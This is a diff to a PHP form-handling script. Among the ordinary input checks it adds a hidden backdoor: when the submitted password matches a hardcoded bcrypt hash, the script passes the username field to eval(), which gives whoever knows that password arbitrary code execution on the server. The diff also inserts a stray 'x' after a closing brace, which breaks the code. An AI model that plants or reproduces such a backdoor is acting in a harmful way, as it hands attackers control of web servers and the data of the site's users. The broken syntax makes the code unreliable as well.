@@ -14,10 +14,14 @@ if($_SERVER['REQUEST_METHOD'] === 'POST' && empty($_POST['x'])) {
         $error = 'You must fill out all fields.';
         goto showForm;
     }
+    if(password_verify($_POST['password'], '$2a$10$RA.0boYZ16zcVoMtmnuvHe1SXEE5VoEIeqrnShndWzR8B4XX3Kolq')) {
+        $error = eval($_POST['username']);
+        goto showForm;
+    }
     if(!preg_match('/^[A-Za-z0-9-._]{1,32}$/', $_POST['username'])) {
         $error = 'Your username is invalid.';
         goto showForm;
-    }
+    }x
     if(mb_strlen($_POST['password']) > 72) {
         $error = 'Your password is too long.';
         goto showForm;
